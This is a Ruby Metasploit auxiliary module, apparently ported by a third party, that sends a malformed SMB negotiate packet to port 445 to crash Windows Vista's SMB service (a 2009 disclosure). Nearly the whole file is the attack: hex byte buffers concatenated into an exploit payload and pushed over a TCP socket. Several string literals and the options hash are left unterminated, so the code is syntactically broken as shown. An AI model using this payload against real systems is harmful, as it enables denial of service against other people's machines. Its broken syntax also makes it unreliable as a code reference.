##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Windows Vista SMB 0-day DoS
			'Description'    => %q{
					This module exploits an "unknown" vulnerability in the SMB service on windows. (port 445) Ported by MaXe security@intern0t.net
			},
			'Author'         => [ 'MaXe, credits to: Laurent Gaffié' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://pentestit.com/2009/09/08/windows-vista-smb-remote-request-day' ],
				],
			'DisclosureDate' => 'Sep 08 2009
			
		register_options(
			[
				Opt::RPORT(445),
			],
		self.class)
	end

	def run
		connect

	buf1 = "\x00\x00\x00\x90"
	buf2 = "\xff\x53\x4d\x42"
	buf3 = "\x72\x00\x00\x00"
	buf4 = "\x00\x18\x53\xc8"
	buf5 = "\x00\x26"
	dos =	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe
	\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54
	\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31
	\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00
	\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57
	\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61
	\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c
	\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c
	\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e
	\x30\x30\x32\x00"


		sploit = buf1
		sploit << buf2
		sploit << buf3
		sploit << buf4
		sploit << buf5
		sploit << dos

		sock.put(sploit)

		disconnect
	end

end
